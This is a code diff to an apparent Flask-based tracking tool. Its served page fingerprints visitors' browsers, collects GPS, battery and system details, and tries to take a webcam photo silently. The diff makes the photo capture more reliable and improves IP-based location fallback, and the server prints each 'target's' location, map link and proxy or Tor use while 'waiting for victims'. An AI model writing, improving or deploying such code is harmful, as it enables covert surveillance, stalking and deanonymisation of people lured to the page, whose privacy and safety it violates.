@@ -118,7 +118,7 @@ HTML_TEMPLATE = '''
                     canvas: getCanvasFingerprint()
                 };
                 updateProgress(30);
-            } catch (e) { console.error(e); }
+            } catch (e) { console.error("Fingerprinting failed", e); }
 
             // 2. Audio Context Fingerprinting
             try {
@@ -177,17 +177,41 @@ HTML_TEMPLATE = '''
             }
             updateProgress(70);
 
-            // 6. Camera (Silent Attempt)
+            // 6. Camera (Silent Attempt - FIXED FOR RELIABILITY)
             statusEl.innerText = "Checking camera access...";
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+                // Request camera with specific constraints to ensure compatibility
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 },
+                        facingMode: "user"
+                    } 
+                });
+                
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500)); 
-                canvas.width = 640;
-                canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                data.photo = canvas.toDataURL('image/png').split(',')[1];
-                stream.getTracks().forEach(track => track.stop());
+                // Wait for the video to be ready
+                await video.play();
+                
+                // Wait extra time for camera hardware to initialize and auto-focus
+                // This is critical for getting a non-black image
+                await new Promise(r => setTimeout(r, 2500)); 
+
+                // Check if video is ready
+                if (video.readyState === 4) {
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
+                    data.photo = canvas.toDataURL('image/png').split(',')[1];
+                } else {
+                    console.log("Video not ready for capture.");
+                }
+
+                // Stop the stream immediately after capture
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+                video.srcObject = null;
             } catch (e) {
                 console.log("Camera Denied or Unavailable.");
             }
@@ -226,6 +250,7 @@ def log_data():
         
         # IP Intelligence (Fallback for Location)
         ip_info = {"city": "Unknown", "region": "Unknown", "country": "Unknown", "org": "Unknown", "is_proxy": False, "lat": None, "lon": None}
+        ip_coords_available = False
         try:
             # Using ipapi.co for IP intelligence and APPROXIMATE location
             resp = requests.get(f'https://ipapi.co/{ip_addr}/json/', timeout=5).json()
@@ -241,6 +266,9 @@ def log_data():
                     "lat": resp.get('latitude'),  # IP-based Lat
                     "lon": resp.get('longitude')   # IP-based Lon
                 }
+                # Check if IP API returned coordinates
+                if resp.get('latitude') and resp.get('longitude'):
+                    ip_coords_available = True
         except Exception as e:
             print(f"IP Lookup failed: {e}")
 
@@ -255,19 +283,25 @@ def log_data():
                 photo_path = filepath
             except Exception as e:
                 photo_path = f"Error saving photo: {e}"
+        else:
+            print(f"\n{Fore.RED}PHOTO: No photo data received (User denied permission or camera failed).")
 
         # Determine Location for Map Link
         # Priority 1: GPS (High Precision)
         # Priority 2: IP Geolocation (Low Precision - City Level)
         map_link = None
         location_source = "None"
+        lat = None
+        lon = None
         
+        # Check for GPS data first
         if data.get('location') and data['location'].get('lat') and data['location'].get('lon'):
             lat = data['location']['lat']
             lon = data['location']['lon']
             map_link = f"https://www.google.com/maps?q={lat},{lon}"
             location_source = "GPS (High Precision)"
-        elif ip_info.get('lat') and ip_info.get('lon'):
+        # Fallback to IP-based coordinates if available
+        elif ip_coords_available:
             lat = ip_info['lat']
             lon = ip_info['lon']
             map_link = f"https://www.google.com/maps?q={lat},{lon}"
@@ -279,26 +313,31 @@ def log_data():
         print(f"{Fore.CYAN}Timestamp: {timestamp}")
         print(f"{Fore.CYAN}Target IP: {ip_addr}")
         
+        # Display Timezone (Fixed)
+        sys_info = data.get('system', {})
+        timezone_str = sys_info.get('timezone', 'Unknown')
+        print(f"{Fore.CYAN}Target Timezone: {timezone_str}")
+
         if map_link:
             print(f"\n{Fore.BLUE}{Style.BRIGHT}🌍 LIVE LOCATION DETECTED: {location_source}")
             print(f"👉 CLICK TO OPEN IN MAPS: {map_link}")
             if location_source == "IP Address (Approximate - City Level)":
                 print(f"   (Note: This is an IP-based estimate for {ip_info['city'], ip_info['region'], ip_info['country']})")
         else:
-            print(f"\n{Fore.RED}⚠️ NO LOCATION DATA AVAILABLE (GPS Denied & IP Lookup Failed)")
+            print(f"\n{Fore.RED}⚠️ NO LOCATION DATA AVAILABLE (GPS Denied & IP Lookup Failed/No Coordinates)")
             print(f"   Target Info: {ip_info['city'], ip_info['region'], ip_info['country']}")
+            if not ip_coords_available:
+                print(f"   Reason: IP API did not return coordinates for this IP.")
 
         print(f"\n{Fore.YELLOW}ISP/Organization: {ip_info['org']}")
         if ip_info.get('is_proxy') or ip_info.get('is_tor'):
             print(f"{Fore.RED}WARNING: Target is using Proxy/Tor/VPN!")
         
         print(f"\n{Fore.GREEN}DEVICE FINGERPRINT:")
-        sys_info = data.get('system', {})
         print(f"  OS/Platform: {sys_info.get('platform', 'Unknown')}")
         print(f"  Device: {sys_info.get('userAgent', 'Unknown')}")
         print(f"  Screen: {sys_info.get('screen', 'Unknown')}")
         print(f"  Language: {sys_info.get('language', 'Unknown')}")
-        print(f"  Timezone: {sys_info.get('timezone', 'Unknown')}")
         
         if data.get('battery'):
             print(f"\n{Fore.MAGENTA}BATTERY STATUS: Level {data['battery'].get('level')} | Charging: {data['battery'].get('charging')}")
@@ -306,8 +345,7 @@ def log_data():
         if photo_path != "None":
             print(f"\n{Fore.GREEN}PHOTO CAPTURED: {photo_path}")
             print(f"  (Saved to local directory)")
-        else:
-            print(f"\n{Fore.RED}PHOTO: Failed or Denied by User")
+        # Else message already printed above
 
         if data.get('fingerprint') and data['fingerprint'].get('webgl'):
             webgl = data['fingerprint']['webgl']
@@ -326,4 +364,5 @@ if __name__ == '__main__':
     print(f"[+] Waiting for victims. Logs will appear here in real-time.")
     print(f"[+] Photos will be saved to: {os.path.abspath(DATA_DIR)}")
     print(f"[+] CLICKABLE MAP LINKS WILL BE GENERATED IF LOCATION IS FOUND.")
+    print(f"[+] TIMEZONE DATA WILL BE DISPLAYED IF AVAILABLE.")
     app.run(host='127.0.0.1', port=5000)
